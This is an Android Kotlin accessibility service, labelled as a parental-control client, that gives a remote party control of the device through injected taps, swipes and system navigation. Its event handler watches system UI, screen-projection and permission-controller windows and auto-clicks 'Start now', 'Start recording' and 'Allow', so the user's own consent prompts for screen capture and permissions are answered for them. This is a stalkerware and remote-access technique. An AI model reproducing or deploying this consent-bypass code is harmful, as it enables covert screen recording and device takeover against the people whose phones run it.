package com.parentalcontrolclient

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.view.accessibility.AccessibilityEvent

import android.view.accessibility.AccessibilityNodeInfo

class RemoteControlService : AccessibilityService() {

  override fun onServiceConnected() {
    super.onServiceConnected()
    instance = this
  }

  override fun onAccessibilityEvent(event: AccessibilityEvent?) {
    if (event == null) return
    try {
      val packageName = event.packageName?.toString() ?: ""
      if (packageName.contains("systemui") || packageName.contains("projection") || packageName.contains("permissioncontroller")) {
        val rootNode = rootInActiveWindow ?: return
        autoClickStartNow(rootNode)
      }
    } catch (e: Exception) {
      e.printStackTrace()
    }
  }

  private fun autoClickStartNow(node: AccessibilityNodeInfo?) {
    if (node == null) return
    val text = node.text?.toString()?.lowercase() ?: ""
    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""

    if (text.contains("start now") || text.contains("start recording") || text.contains("allow") ||
        contentDescription.contains("start now") || contentDescription.contains("start recording")) {
      node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
      return
    }

    for (i in 0 until node.childCount) {
      autoClickStartNow(node.getChild(i))
    }
  }

  override fun onInterrupt() {
    // No-op
  }

  override fun onDestroy() {
    instance = null
    super.onDestroy()
  }

  fun performTouch(x: Float, y: Float): Boolean {
    val path = Path().apply { moveTo(x, y) }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, TAP_DURATION_MS))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long): Boolean {
    val path = Path().apply {
      moveTo(x1, y1)
      lineTo(x2, y2)
    }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun performLongPress(x: Float, y: Float, durationMs: Long = LONG_PRESS_DURATION_MS): Boolean {
    val path = Path().apply { moveTo(x, y) }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun executeGlobalAction(action: Int): Boolean = performGlobalAction(action)

  companion object {
    @Volatile
    var instance: RemoteControlService? = null
      private set

    const val TAP_DURATION_MS = 100L
    const val LONG_PRESS_DURATION_MS = 500L

    // Global actions for remote control
    const val ACTION_HOME = GLOBAL_ACTION_HOME
    const val ACTION_BACK = GLOBAL_ACTION_BACK
    const val ACTION_RECENTS = GLOBAL_ACTION_RECENTS
    const val ACTION_NOTIFICATIONS = GLOBAL_ACTION_NOTIFICATIONS
    const val ACTION_QUICK_SETTINGS = GLOBAL_ACTION_QUICK_SETTINGS
  }
}
